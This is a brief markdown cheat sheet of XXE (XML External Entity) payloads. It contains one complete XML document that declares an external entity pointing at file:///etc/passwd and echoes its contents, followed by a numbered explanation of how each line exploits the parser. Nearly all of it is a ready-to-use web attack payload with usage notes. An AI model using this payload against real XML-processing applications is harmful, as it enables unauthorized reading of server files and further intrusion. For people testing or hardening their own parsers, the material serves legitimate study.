# XXE Payloads

## Payload 1: Read Local File (/etc/passwd)

This payload uses an external entity to read a sensitive file from the server's operating system. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### How this payload works:
1. `<!DOCTYPE root [...]>`: This part starts the DTD (Document Type Definition) where we can create entities (variables).
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`: This creates an external entity named `xxe`. The `SYSTEM` keyword tells the XML parser to go and read the `/etc/passwd` file from the server.
3. `<data>&xxe;</data>`: This calls the `xxe` entity. When the application parses this XML, it replaces `&xxe;` with the full text of the password file and shows it on the screen.